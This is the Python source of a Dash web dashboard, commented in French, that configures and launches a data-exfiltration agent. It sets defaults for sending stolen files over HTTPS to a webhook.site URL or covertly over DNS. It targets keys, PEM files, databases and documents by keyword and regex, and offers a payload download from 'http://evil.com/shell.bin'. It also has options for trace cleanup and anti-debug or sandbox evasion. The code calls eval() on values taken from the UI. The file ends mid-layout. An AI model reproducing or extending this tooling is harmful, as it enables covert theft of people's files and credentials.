import dash
from dash import dcc, html, dash_table
from dash.dependencies import Input, Output, State, ALL, MATCH
import subprocess
import shlex
import os
import time
import json
import sys
import base64
import signal
import re
from datetime import datetime

# --- IMPORTS DE TES MODULES (s'assurer que le chemin est correct) ---
AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
if AGENT_DIR not in sys.path:
    sys.path.insert(0, AGENT_DIR)

# Import du nouveau LogStreamer
from modules.log_streamer import LogStreamer

# Global pour stocker le dernier index des logs lus par l'interface,
# pour permettre la récupération incrémentale.
# La gestion des logs des explorateurs sera centralisée par le LogStreamer.
explorer_log_states = {
    'file_explorer': {'last_index': 0, 'logs': []}, # On garde ces états pour le contrôle
    'web_explorer': {'last_index': 0, 'logs': []}   # Mais les "logs" viendront du LogStreamer
}

# --- Initialisation du LogStreamer global ---
# C'est cette instance qui va capturer TOUTES les sorties de print/logger.
global_log_streamer = LogStreamer(max_buffer_lines=1000)
global_log_streamer.start_capturing() # Démarrage de la capture dès le début de l'application


# --- Définition d'un Logger/Mock pour compatibilité (moins pertinent maintenant) ---
# Ce logger devient moins essentiel pour la capture d'UI, mais peut servir pour le fichier chiffré.
# On le garde pour la compatibilité avec AgentLogger qui gère le fichier chiffré.
_GLOBAL_MODULE_LOGGER = None
try:
    from modules.logger import Logger as AgentLogger
    # On désactive stdout pour AgentLogger ici, car LogStreamer s'en charge.
    _GLOBAL_MODULE_LOGGER = AgentLogger(log_file_path=None, cipher_key=None, debug_mode=True, stdout_enabled=False)
    print("[INFO] modules.logger.Logger importé et configuré (sans stdout direct via lui).")
except ImportError:
    # UIMockLogger est une version simplifiée qui écrit dans un buffer interne, mais ne gère pas stdout globalement.
    # Dans la nouvelle approche, le LogStreamer s'occupe de stdout.
    # Ce UIMockLogger ne sera utilisé que si AgentLogger est absent ET s'il y a des appels _LOGGER.log_xx directs.
    class UIMockLoggerFallback:
        def __init__(self):
            # Cette instance n'aura pas son propre buffer pour l'UI, car le LogStreamer capture tout.
            pass
        def log_debug(self, msg): print(f"[MOCK_DEBUG] {msg}")
        def log_info(self, msg): print(f"[MOCK_INFO] {msg}")
        def log_warning(self, msg): print(f"[MOCK_WARNING] {msg}")
        def log_error(self, msg): print(f"[MOCK_ERROR] {msg}")
        def log_critical(self, msg): print(f"[MOCK_CRITICAL] {msg}")
        def get_new_logs(self, last_log_index: int = 0) -> tuple[list[str], int]: return [], 0 # Ne capture pas
        def reset_logs(self): pass

    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback()
    print("[AVERTISSEMENT] modules.logger.Logger non trouvé. Utilisation de UIMockLoggerFallback pour les explorateurs.")
except Exception as e:
    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback() # Fallback en cas d'erreur inattendue
    print(f"[CRITICAL] Erreur lors de l'initialisation de modules.logger.Logger: {e}. Utilisation de UIMockLoggerFallback.")


# --- Définition des classes Mock/Fallback pour les explorateurs ---
class BaseMockExplorer:
    TARGET_TYPE_FILE = "file"
    TARGET_TYPE_DIRECTORY = "directory"

    def __init__(self, debug_mode: bool = False):
        # Les mocks peuvent toujours utiliser _GLOBAL_MODULE_LOGGER s'il est configuré pour fichier log
        # Ou simplement des print() qui seront capturés par LogStreamer
        self._LOGGER = _GLOBAL_MODULE_LOGGER # On garde ça, mais les prints iront au LogStreamer
        self._LOGGER.log_warning(f"[{self.__class__.__name__}] Module non importé, utilisant un mock.")

    def explore_path(self, *args, **kwargs):
        # Utilise print() pour que le LogStreamer le capture
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité explore_path non implémentée.")
        return []

    def explore_url(self, *args, **kwargs):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité explore_url non implémentée.")
        return []

    def read_file_content(self, *args, **kwargs):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité read_file_content non implémentée.")
        return "[ERROR] Explorer module is not available."

    def read_file_content_from_url(self, *args, **kwargs):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité read_file_content_from_url non implémentée.")
        return "[ERROR] Explorer module is not available."

    def download_file_base64(self, *args, **kwargs):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité download_file_base64 non implémentée.")
        return "[ERROR] Explorer module is not available."

    def download_file_base64_from_url(self, *args, **kwargs):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] Fonctionnalité download_file_base64_from_url non implémentée.")
        return "[ERROR] Explorer module is not available."

    def get_found_targets(self):
        return []

    def reset_state(self):
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BaseMockExplorer] État réinitialisé (mock).")
        pass


# --- Tente d'importer les modules réels, utilise les mocks si l'import échoue ---
OriginalFileExplorer = BaseMockExplorer # Initialise avec le mock par défaut
OriginalWebExplorer = BaseMockExplorer # Initialise avec le mock par défaut
AES256Cipher = None # Initialise à None par défaut

try:
    from modules.file_explorer import FileExplorer as ImportedFileExplorer
    OriginalFileExplorer = ImportedFileExplorer
    # Plus besoin de patcher _LOGGER ici si les explorateurs utilisent print() ou leur logger interne
    # et que LogStreamer capture sys.stdout/stderr.
    # Cependant, si leurs fonctions log_info/log_error sont toujours utilisées par d'autres parties,
    # et que tu veux qu'ils utilisent notre _GLOBAL_MODULE_LOGGER pour le fichier log par exemple,
    # cette ligne reste utile. Pour la capture UI, LogStreamer est prioritaire.
    OriginalFileExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
    print("[INFO] modules.file_explorer.FileExplorer importé avec succès.")
except ImportError as e:
    print(f"[CRITICAL] Erreur d'importation de modules.file_explorer: {e}. Les fonctionnalités de File Explorer seront limitées.")
    # OriginalFileExplorer reste BaseMockExplorer

try:
    from modules.web_explorer import WebExplorer as ImportedWebExplorer
    OriginalWebExplorer = ImportedWebExplorer
    # Idem pour WebExplorer
    OriginalWebExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
    print("[INFO] modules.web_explorer.WebExplorer importé avec succès.")
except ImportError as e:
    print(f"[CRITICAL] Erreur d'importation de modules.web_explorer: {e}. Les fonctionnalités de Web Explorer seront limitées.")
    # OriginalWebExplorer reste BaseMockExplorer

try:
    from modules.aes256 import AES256Cipher as ImportedAES256Cipher
    AES256Cipher = ImportedAES256Cipher
    print("[INFO] modules.aes256.AES256Cipher importé avec succès.")
except ImportError as e:
    print(f"[CRITICAL] Erreur d'importation de modules.aes256: {e}. Le chiffrement des logs ne sera pas disponible.")
    AES256Cipher = None


# Crée les instances globales des explorateurs, qui sont soit les vraies classes importées,
# soit nos classes Mock si l'importation a échoué.
# Chaque instance utilisera le _GLOBAL_MODULE_LOGGER (qui lui-même peut imprimer via stdout et donc via LogStreamer)
global_file_explorer = OriginalFileExplorer(debug_mode=True)
global_web_explorer = OriginalWebExplorer(debug_mode=True)


# --- Configuration des Chemins ---
AGENT_PATH = os.path.join(AGENT_DIR, 'exf_agent.py')
LOG_FILE_PATH = os.path.join(AGENT_DIR, 'agent_logs.enc')
SHARED_CONFIG_FILE = os.path.join(AGENT_DIR, 'shared_config.json')

# --- Globals pour l'état du processus de l'agent ---
running_agent_process = None
agent_output_buffer = [] # Buffer pour les logs de l'agent principal (non-explorateur)

# --- Fonctions utilitaires ---
def generate_aes_key(length: int = 32) -> str:
    """Génère une clé AES aléatoire de la longueur spécifiée (en bytes) et l'encode en Base64."""
    return base64.urlsafe_b64encode(os.urandom(length)).decode('utf-8').rstrip('=')

def load_shared_config():
    """Charge la configuration depuis le fichier JSON partagé."""
    config_data = {}
    if os.path.exists(SHARED_CONFIG_FILE):
        try:
            with open(SHARED_CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
            print(f"[INFO] Fichier de configuration partagé '{SHARED_CONFIG_FILE}' chargé.")
        except json.JSONDecodeError:
            print(f"[ERREUR] Le fichier '{SHARED_CONFIG_FILE}' est corrompu. Recréation forcée lors de la première sauvegarde.")
        except Exception as e:
            print(f"[ERREUR] Erreur lors du chargement de la config partagée '{SHARED_CONFIG_FILE}': {e}")
    return config_data

def save_shared_config(config_data: dict):
    """Sauvegarde la configuration dans le fichier JSON partagé."""
    try:
        with open(SHARED_CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        print(f"[INFO] Configuration sauvegardée dans '{SHARED_CONFIG_FILE}'.")
    except Exception as e:
            print(f"[ERREUR] Impossible de sauvegarder la configuration dans '{SHARED_CONFIG_FILE}': {e}")

# --- Charger/Générer la configuration au démarrage de l'application Dash ---
shared_config_data = load_shared_config()

if not shared_config_data or 'aes_key' not in shared_config_data:
    print("[INFO] Génération d'une nouvelle configuration partagée (clé AES et valeurs par défaut).")
    shared_config_data = {
        "aes_key": generate_aes_key(),
        "default_target_url": "https://webhook.site/VOTRE_URL_UNIQUE_ICI",
        "default_scan_path": os.path.expanduser('~') + "/storage/shared",
        "default_file_types": ".doc,.docx,.txt,.pdf,.xls,.xlsx,.csv,.db,.sqlite,.json,.xml,.key,.pem,.pptx,.log,.md",
        "default_exclude_types": ".exe,.dll,.sys,.bin,.tmp,.py,.sh,.bak,.old",
        "default_min_size": "1k",
        "default_max_size": "100M",
        "default_dns_server": "8.8.8.8",
        "default_dns_domain": "exfil.yourdomain.com",
        "default_keywords": "",
        "default_regex_patterns": "",
        "default_payload_url": "",
        "default_payload_path": "",
        "default_threads": 4,
        "default_debug_mode": True,
        "default_no_clean": True,
        "default_no_anti_evasion": False,
        "default_explorer_target_host": "http://127.0.0.1",
        "default_explorer_base_path": "/var/www/html" if os.path.exists("/var/www/html") else "",
        "default_explorer_depth": 3
    }
    save_shared_config(shared_config_data)
    print(f"[ATTENTION] Veuillez remplacer l'URL 'https://webhook.site/VOTRE_URL_UNIQUE_ICI' dans le fichier '{SHARED_CONFIG_FILE}' par votre URL webhook.site via l'interface ou manuellement !")

# --- Valeurs par défaut de l'UI (utilisées dans le layout) ---
DEFAULT_AES_KEY = shared_config_data.get('aes_key', '')
DEFAULT_TARGET_URL = shared_config_data.get('default_target_url', '')
DEFAULT_SCAN_PATH = shared_config_data.get('default_scan_path', os.path.expanduser('~'))
DEFAULT_FILE_TYPES = shared_config_data.get('default_file_types', '')
DEFAULT_EXCLUDE_TYPES = shared_config_data.get('default_exclude_types', '')
DEFAULT_MIN_SIZE = shared_config_data.get('default_min_size', '1k')
DEFAULT_MAX_SIZE = shared_config_data.get('default_max_size', '100M')
DEFAULT_DNS_SERVER = shared_config_data.get('default_dns_server', '8.8.8.8')
DEFAULT_DNS_DOMAIN = shared_config_data.get('default_dns_domain', '')
DEFAULT_KEYWORDS = shared_config_data.get('default_keywords', '')
DEFAULT_REGEX_PATTERNS = shared_config_data.get('default_regex_patterns', '')
DEFAULT_PAYLOAD_URL = shared_config_data.get('default_payload_url', '')
DEFAULT_PAYLOAD_PATH = shared_config_data.get('default_payload_path', '')
DEFAULT_THREADS = shared_config_data.get('default_threads', 4)
DEFAULT_DEBUG_MODE = ['debug'] if shared_config_data.get('default_debug_mode', True) else []
DEFAULT_NO_CLEAN = ['no-clean'] if shared_config_data.get('default_no_clean', True) else []
DEFAULT_NO_ANTI_EVASION = ['no-anti-evasion'] if shared_config_data.get('default_no_anti_evasion', False) else []
DEFAULT_EXPLORER_TARGET_HOST = shared_config_data.get('default_explorer_target_host', "http://127.0.0.1")
DEFAULT_EXPLORER_BASE_PATH = shared_config_data.get('default_explorer_base_path', "")
DEFAULT_EXPLORER_DEPTH = shared_config_data.get('default_explorer_depth', 3)
DEFAULT_EXFIL_METHOD = shared_config_data.get('default_exfil_method', 'https')


# --- Initialisation de l'application Dash ---
app = dash.Dash(__name__, title="AGENT EXFILTRATION :: CYBER OPS HUB")

# ACTIVER LE SUPPRESS CALLBACK EXCEPTIONS POUR LES COMPOSANTS DYNAMIQUES
app.config.suppress_callback_exceptions = True


# --- Styles CSS pour un thème "Cyber Ops" ---
CYBER_OPS_STYLE = {
    'backgroundColor': '#0A0A0A',
    'color': '#00FF41',
    'fontFamily': '"Consolas", "Courier New", monospace',
    'padding': '0',
    'margin': '0',
    'minHeight': '100vh',
    'display': 'flex',
    'flexDirection': 'column'
}

CYBER_HEADER_STYLE = {
    'textAlign': 'center',
    'color': '#00FFFF',
    'padding': '20px 0',
    'marginBottom': '0px',
    'textShadow': '0 0 10px rgba(0,255,255,0.7)',
    'fontSize': '2.5em',
    'fontWeight': 'bold',
    'letterSpacing': '3px',
    'borderBottom': '1px solid #005500',
    'backgroundColor': '#1A1A1A'
}

CYBER_TABS_CONTAINER_STYLE = {
    'backgroundColor': '#1A1A1A',
    'borderBottom': '1px solid #005500',
    'paddingLeft': '20px',
    'paddingRight': '20px',
    'paddingTop': '10px'
}

CYBER_TAB_STYLE = {
    'backgroundColor': '#0F0F0F',
    'color': '#00FFFF',
    'border': '1px solid #005500',
    'borderBottom': 'none',
    'borderRadius': '5px 5px 0 0',
    'padding': '10px 20px',
    'marginRight': '5px',
    'fontSize': '1.1em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1px',
    'transition': 'all 0.2s ease-in-out'
}

CYBER_TAB_SELECTED_STYLE = {
    'backgroundColor': '#005500',
    'color': '#00FF41',
    'border': '1% solid #00FF41',
    'borderBottom': 'none',
    'borderRadius': '5px 5px 0 0',
    'padding': '10px 20px',
    'marginRight': '5px',
    'fontSize': '1.1em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

CYBER_SECTION_CONTENT_STYLE = {
    'padding': '30px',
    'maxWidth': '900px',
    'margin': '20px auto',
    'backgroundColor': '#1A1A1A',
    'borderRadius': '5px',
    'boxShadow': '0 0 15px rgba(0,255,65,0.1)',
    'border': '1px solid #007700',
    'flexGrow': '1'
}

CYBER_SECTION_HEADER_STYLE = {
    'color': '#FF00FF',
    'borderBottom': '1px solid #330033',
    'paddingBottom': '10px',
    'marginBottom': '20px',
    'textShadow': '0 0 5px rgba(255,0,255,0.5)',
    'fontSize': '1.6em',
    'fontWeight': 'bold'
}

# Adjusted for responsive design
CYBER_INPUT_WRAPPER_STYLE = {
    'display': 'flex',
    'alignItems': 'center',
    'marginBottom': '15px'
}

CYBER_INPUT_STYLE = {
    'flexGrow': '1', # Prend l'espace disponible
    'padding': '12px',
    'backgroundColor': '#0A0A0A',
    'border': '1px solid #007700',
    'borderRadius': '3px',
    'color': '#00FF41',
    'boxSizing': 'border-box',
    'boxShadow': 'inset 0 0 5px rgba(0,255,65,0.05)',
    'fontSize': '1rem' # Taille de police de base pour la réactivité
}

CYBER_BUTTON_PRIMARY = {
    'backgroundColor': '#00FF41',
    'color': '#0A0A0A',
    'marginTop': '25px',
    'padding': '15px 30px',
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '1.2rem', # Utilise rem pour la réactivité
    'fontWeight': 'bold',
    'boxShadow': '0 0 15px rgba(0,255,65,0.7)',
    'transition': 'all 0.2s ease-in-out',
    'marginRight': '10px',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

CYBER_BUTTON_SECONDARY = {
    'backgroundColor': '#00BFFF',
    'color': '#0A0A0A',
    'marginTop': '25px',
    'padding': '15px 30px',
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '1.2rem', # Utilise rem pour la réactivité
    'fontWeight': 'bold',
    'boxShadow': '0 0 10px rgba(0,191,255,0.5)',
    'transition': 'all 0.2s ease-in-out',
    'marginRight': '10px',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

CYBER_BUTTON_DANGER = {
    'backgroundColor': '#FF0000',
    'color': '#FFFFFF',
    'marginTop': '25px',
    'padding': '15px 30px',
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '1.2rem', # Utilise rem pour la réactivité
    'fontWeight': 'bold',
    'boxShadow': '0 0 15px rgba(255,0,0,0.7)',
    'transition': 'all 0.2s ease-in-out',
    'marginLeft': '10px',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

# Nouveau style pour le bouton "Apply"
CYBER_BUTTON_APPLY = {
    'backgroundColor': '#E5C07B', # Couleur or/jaune rouille
    'color': '#0A0A0A',
    'padding': '8px 15px', # Ajusté pour être plus petit
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '0.8rem', # Plus petit pour s'adapter à côté des inputs
    'fontWeight': 'bold',
    'boxShadow': '0 0 8px rgba(229,192,123,0.5)',
    'transition': 'all 0.1s ease-in-out',
    'marginLeft': '5px', # Marge à gauche pour séparer de l'input
    'flexShrink': '0' # Empêche le bouton de rétrécir
}

# Style pour le bouton APPLY quand il est activé (vert non fluo)
CYBER_BUTTON_APPLY_ACTIVE = {
    **CYBER_BUTTON_APPLY,
    'backgroundColor': '#00A000', # Vert plus sombre, non fluo
    'boxShadow': '0 0 10px rgba(0,160,0,0.7)',
    'color': '#FFFFFF' # Texte blanc pour contraste
}


CYBER_STATUS_BOX_STYLE = {
    'backgroundColor': '#050505',
    'padding': '20px',
    'borderRadius': '5px',
    'overflowX': 'auto',
    'whiteSpace': 'pre-wrap',
    'wordWrap': 'break-word',
    'color': '#00FF41',
    'border': '1px solid #007700',
    'minHeight': '150px',
    'maxHeight': '400px',
    'overflowY': 'auto',
    'boxShadow': 'inset 0 0 5px rgba(0,255,65,0.05)',
    'fontSize': '0.9rem' # Taille de police pour les logs
}
CYBER_STATUS_ERROR = {**CYBER_STATUS_BOX_STYLE, 'color': '#FF0000', 'border': '1px solid #FF0000'}
CYBER_STATUS_WARNING = {**CYBER_STATUS_BOX_STYLE, 'color': '#FFFF00', 'border': '1px solid #FFFF00'}
CYBER_STATUS_INFO = {**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'border': '1px solid #00BFFF'}

CYBER_TABLE_HEADER_STYLE = {
    'backgroundColor': '#0F0F0F',
    'color': '#00FFFF',
    'fontWeight': 'bold',
    'border': '1px solid #007700',
    'textAlign': 'center',
    'padding': '10px',
    'textTransform': 'uppercase',
    'letterSpacing': '0.5px',
    'fontSize': '0.9rem' # Taille de police pour le tableau
}

CYBER_TABLE_CELL_STYLE = {
    'backgroundColor': '#050505',
    'color': '#00FF41',
    'border': '1px solid #004400',
    'padding': '10px',
    'whiteSpace': 'normal',
    'height': 'auto',
    'textAlign': 'left',
    'fontSize': '0.85rem' # Taille de police pour le tableau
}

# Styles pour les boutons d'action du tableau (Lire/Télécharger)
CYBER_ACTION_BUTTON_TABLE_STYLE = { # Nouveau nom pour éviter le conflit
    'backgroundColor': '#00BFFF',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px', # Plus petit pour tenir dans le tableau
    'padding': '4px 8px', # Plus petit
    'margin': '2px',
    'cursor': 'pointer',
    'fontSize': '0.75rem', # Encore plus petit
    'fontWeight': 'bold',
    'boxShadow': '0 0 5px rgba(0,191,255,0.3)',
    'textTransform': 'uppercase'
}
CYBER_DOWNLOAD_BUTTON_TABLE_STYLE = { # Nouveau nom
    'backgroundColor': '#FF00FF',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px',
    'padding': '4px 8px',
    'margin': '2px',
    'cursor': 'pointer',
    'fontSize': '0.75rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 5px rgba(255,0,255,0.3)',
    'textTransform': 'uppercase'
}


# --- Layout de l'application Dash ---
app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
    html.H1("AGENT EXFILTRATION :: CYBER OPS HUB", style=CYBER_HEADER_STYLE),

    dcc.Tabs(
        id="cyber-tabs",
        value='tab-agent-control',
        parent_className='custom-tabs-container',
        className='custom-tabs',
        children=[
            dcc.Tab(label=':: AGENT CONTROL ::', value='tab-agent-control', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: FILE EXPLORER ::', value='tab-file-explorer', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: LOGS & STATUS ::', value='tab-logs-status', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
        ],
        style={**CYBER_TABS_CONTAINER_STYLE, 'maxWidth': '900px', 'margin': '0 auto'}
    ),

    html.Div(id='tabs-content', style={'flexGrow': '1'}),

    # --- Éléments cachés pour persister l'état (TOUS SONT dcc.Input) ---
    html.Div(id='hidden-elements', style={'display': 'none'}, children=[
        # Agent Control States
        dcc.Input(id='target-url-hidden', type='text', value=DEFAULT_TARGET_URL),
        dcc.Input(id='scan-path-hidden', type='text', value=DEFAULT_SCAN_PATH),
        dcc.Input(id='aes-key-hidden', type='text', value=DEFAULT_AES_KEY),
        dcc.Input(id='exfil-method-hidden', type='text', value=DEFAULT_EXFIL_METHOD),
        dcc.Input(id='dns-server-hidden', type='text', value=DEFAULT_DNS_SERVER),
        dcc.Input(id='dns-domain-hidden', type='text', value=DEFAULT_DNS_DOMAIN),
        dcc.Input(id='file-types-hidden', type='text', value=DEFAULT_FILE_TYPES),
        dcc.Input(id='exclude-types-hidden', type='text', value=DEFAULT_EXCLUDE_TYPES),
        dcc.Input(id='min-size-hidden', type='text', value=DEFAULT_MIN_SIZE),
        dcc.Input(id='max-size-hidden', type='text', value=DEFAULT_MAX_SIZE),
        dcc.Input(id='keywords-hidden', type='text', value=DEFAULT_KEYWORDS),
        dcc.Input(id='regex-patterns-hidden', type='text', value=DEFAULT_REGEX_PATTERNS),
        dcc.Input(id='payload-url-hidden', type='text', value=DEFAULT_PAYLOAD_URL),
        dcc.Input(id='payload-path-hidden', type='text', value=DEFAULT_PAYLOAD_PATH),
        dcc.Input(id='threads-hidden', type='number', value=DEFAULT_THREADS),
        dcc.Input(id='debug-mode-hidden', type='text', value=str(DEFAULT_DEBUG_MODE)),
        dcc.Input(id='no-clean-hidden', type='text', value=str(DEFAULT_NO_CLEAN)),
        dcc.Input(id='no-anti-evasion-hidden', type='text', value=str(DEFAULT_NO_ANTI_EVASION)),

        # Explorer States
        dcc.Input(id='explorer-target-host-hidden', type='text', value=DEFAULT_EXPLORER_TARGET_HOST),
        dcc.Input(id='explorer-base-path-hidden', type='text', value=DEFAULT_EXPLORER_BASE_PATH),
        dcc.Input(id='explorer-max-depth-hidden', type='number', value=DEFAULT_EXPLORER_DEPTH),

        # Hidden store for last log index (for explorer logs)
        dcc.Store(id='explorer-log-last-index', data={'file': 0, 'web': 0}),
    ]),
    # Moved dcc.Interval to be conditional within its tab's content
    # This interval now does NOT exist globally in the layout.
    # It will be rendered only when the 'tab-file-explorer' is active.
])

# Callback pour rendre le contenu des onglets
@app.callback(
    Output('tabs-content', 'children'),
    Input('cyber-tabs', 'value'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'), State('explorer-base-path-hidden', 'value'), State('explorer-max-depth-hidden', 'value')
)
def render_tab_content(tab,
                       target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, file_types, exclude_types, min_size, max_size, keywords, regex_patterns, payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                       explorer_target_host, explorer_base_path, explorer_max_depth):

    # Reconvertir les listes de valeurs des checklists depuis leur représentation en chaîne
    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str


    # Options pour les Checklists et Dropdown
    debug_checklist_options = [{'label': ' ENABLE DEBUG MODE (Verbose logs, no cleanup)', 'value': 'debug'}]
    no_clean_checklist_options = [{'label': ' DISABLE TRACE CLEANUP', 'value': 'no-clean'}]
    no_anti_evasion_checklist_options = [{'label': ' DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'value': 'no-anti-evasion'}]
    exfil_method_options = [
        {'label': 'HTTPS (Recommended)', 'value': 'https'},
        {'label': 'DNS (Covert, requires controlled DNS server)', 'value': 'dns'}
    ]

    # Helper function to create a styled input section
    def create_input_section(label_text, input_id, value, placeholder=None, type='text', min=None, max=None, required=False, options=None):
        return html.Div([
            html.Div(label_text, style={'marginTop': '10px', 'color': '#00FFFF', 'width': '100%'}),
            html.Div([
                dcc.Input(
                    id=input_id,
                    type=type,
                    value=value,
                    placeholder=placeholder,
                    style=CYBER_INPUT_STYLE,
                    required=required,
                    min=min,
                    max=max,
                ) if options is None else dcc.Dropdown(
                    id=input_id,
                    options=options,
                    value=value,
                    style={**CYBER_INPUT_STYLE, 'color': '#00FF41', 'padding': '0', 'height': 'auto'},
                    clearable=False,
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0,
                            style=CYBER_BUTTON_APPLY)
            ], style=CYBER_INPUT_WRAPPER_STYLE)
        ])

    # Helper function for checklist sections
    def create_checklist_section(label_text, input_id, value, options):
        return html.Div([
            html.Div([
                dcc.Checklist(
                    id=input_id,
                    options=options,
                    value=value,
                    style={'color': '#00FF41', 'marginTop': '10px', 'flexGrow': '1'},
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0, style={**CYBER_BUTTON_APPLY, 'marginTop': '0px'})
            ], style=CYBER_INPUT_WRAPPER_STYLE)
        ])


    if tab == 'tab-agent-control':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT CONFIGURATION ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("TARGET URL (HTTPS/DNS) *:", 'target-url', target_url, required=True),
            create_input_section("SCAN PATH *:", 'scan-path', scan_path, required=True),
            create_input_section("AES KEY (32 bytes) *:", 'aes-key', aes_key, required=True),
            create_input_section("EXFIL METHOD *:", 'exfil-method', exfil_method, options=exfil_method_options),

            html.Div(id='dns-options-div', children=[
                create_input_section("DNS SERVER (IP) *:", 'dns-server', dns_server, placeholder='Ex: 8.8.8.8 (Google DNS)'),
                create_input_section("DNS DOMAIN *:", 'dns-domain', dns_domain, placeholder='Ex: exfil.yourdomain.com'),
            ], style={'display': 'none'}),

            html.H2(":: FILTERING OPTIONS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("FILE TYPES TO INCLUDE (Ex: .doc,.txt,.pdf):", 'file-types', file_types),
            create_input_section("FILE TYPES TO EXCLUDE (Ex: .exe,.dll):", 'exclude-types', exclude_types),
            create_input_section("MIN SIZE (Ex: 5k, 1M, 1G):", 'min-size', min_size),
            create_input_section("MAX SIZE (Ex: 10M, 1G):", 'max-size', max_size),
            create_input_section("KEYWORDS IN CONTENT (Ex: secret,password):", 'keywords', keywords, placeholder='Separated by commas'),
            create_input_section("REGEX PATTERNS IN CONTENT (Ex: (\\d{3}-\\d{2}-\\d{4})):", 'regex-patterns', regex_patterns, placeholder='Separated by commas'),

            html.H2(":: ADVANCED & COVERT OPTIONS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("PAYLOAD URL (Optional):", 'payload-url', payload_url, placeholder='Ex: http://evil.com/shell.bin'),
            create_input_section("PAYLOAD PATH (Optional):", 'payload-path', payload_path, placeholder='Ex: /data/local/tmp/payload_binary'),
            create_input_section("THREADS (for scan & upload):", 'threads', threads, type='number'),

            create_checklist_section('ENABLE DEBUG MODE (Verbose logs, no cleanup)', 'debug-mode', debug_mode_val, debug_checklist_options),
            create_checklist_section('DISABLE TRACE CLEANUP', 'no-clean', no_clean_val, no_clean_checklist_options),
            create_checklist_section('DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'no-anti-evasion', no_anti_evasion_val, no_anti_evasion_checklist_options),

            html.Button('SAVE CONFIG', id='save-config-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
            html.Button('LAUNCH AGENT', id='launch-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
            html.Button('STOP AGENT', id='stop-button', n_clicks=0, style=CYBER_BUTTON_DANGER),

        ])
    elif tab == 'tab-file-explorer':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            # MOVED dcc.Interval HERE
            dcc.Interval(
                id='interval-explorer-logs',
                interval=1 * 1000, # in milliseconds (1 second)
                n_intervals=0
            ),
            html.H2(":: TARGET FILE EXPLORER ::", style=CYBER_SECTION_HEADER_STYLE),

            create_input_section("TARGET HOST (URL or IP) *:", 'explorer-target-host-display', explorer_target_host, required=True),
            create_input_section("BASE PATH FOR EXPLORATION (Optional, e.g., /var/www/html/wp-content/uploads/):", 'explorer-base-path-display', explorer_base_path, placeholder="Leave empty for full site crawl"),
            create_input_section("MAX EXPLORATION DEPTH (0 for base only, 1 for direct subfolders, etc.) :", 'explorer-max-depth-display', explorer_max_depth, type='number', min=0, required=True),

